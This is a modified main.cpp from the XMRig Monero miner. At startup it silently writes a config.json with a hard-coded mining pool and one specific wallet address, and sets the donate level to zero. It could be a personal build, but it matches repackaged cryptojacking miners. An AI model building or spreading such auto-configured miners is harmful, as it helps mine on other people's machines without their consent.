/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"

#include <cstdio>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <libgen.h>
#include <linux/limits.h>
#endif

static void write_default_config(const char *argv0)
{
    static const char *cfg =
        "{\n"
        "    \"autosave\": true,\n"
        "    \"cpu\": true,\n"
        "    \"opencl\": false,\n"
        "    \"cuda\": false,\n"
        "    \"donate-level\": 0,\n"
        "    \"pools\": [\n"
        "        {\n"
        "            \"coin\": \"monero\",\n"
        "            \"algo\": \"rx/0\",\n"
        "            \"url\": \"xmr-us.kryptex.network:7029\",\n"
        "            \"user\": \"89eWJ7ccdVr3GHBAYsKG28eqWcn2PMWzYeFE5xtgWzg1UimfWS62Qq4VpUSQrX3vaDeMTAMhBVR885RxkLzXNkmFV9yXvcg\",\n"
        "            \"pass\": \"x\",\n"
        "            \"tls\": false,\n"
        "            \"keepalive\": true,\n"
        "            \"nicehash\": false\n"
        "        }\n"
        "    ]\n"
        "}\n";

    char dir[4096] = {0};

#ifdef _WIN32
    GetModuleFileNameA(NULL, dir, sizeof(dir) - 1);
    char *slash = strrchr(dir, '\\');
    if (slash) *(slash + 1) = '\0';
#else
    ssize_t len = readlink("/proc/self/exe", dir, sizeof(dir) - 1);
    if (len > 0) {
        dir[len] = '\0';
        char *slash = strrchr(dir, '/');
        if (slash) *(slash + 1) = '\0';
    } else {
        strncpy(dir, "./", sizeof(dir) - 1);
    }
#endif

    char path[4096] = {0};
    snprintf(path, sizeof(path), "%sconfig.json", dir);

    FILE *f = fopen(path, "r");
    if (f) {
        fclose(f);
        return;
    }

    f = fopen(path, "w");
    if (f) {
        fputs(cfg, f);
        fclose(f);
    }
}


int main(int argc, char **argv)
{
    write_default_config(argv[0]);

    using namespace xmrig;

    Process process(argc, argv);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
